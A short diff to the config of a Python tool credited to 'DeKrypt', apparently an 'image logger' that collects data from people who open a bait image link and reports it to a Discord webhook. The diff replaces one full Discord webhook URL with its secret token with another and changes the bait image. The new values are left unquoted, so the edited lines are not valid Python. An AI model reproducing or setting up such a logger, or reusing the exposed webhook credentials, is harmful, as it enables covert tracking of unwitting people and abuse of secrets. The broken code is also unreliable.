@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1349511250391859251/dAcP6yNxbr4KPxmTN6sodWODrGG30iAkH01mRMNA-Jb0R1jluTL9_rG847YWVSI1vWsR",
-    "image": "https://i.imgflip.com/6byx1t.png?a483528", # You can also have a custom image by using a URL argument
+    "webhook": https://discordapp.com/api/webhooks/1458948810851221627/baj0PTRAcYrMba2Kb2U_dH53qynMFRzsz9Jo53uZnGLKVehEYydx3xKdwXAC7LpMq2D-,
+    "image": https://static.vecteezy.com/system/resources/previews/013/946/309/original/information-and-communication-technology-concept-ict-information-and-communication-technology-on-dark-blue-background-wireless-communication-network-intelligent-system-automation-vector.jpg, # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
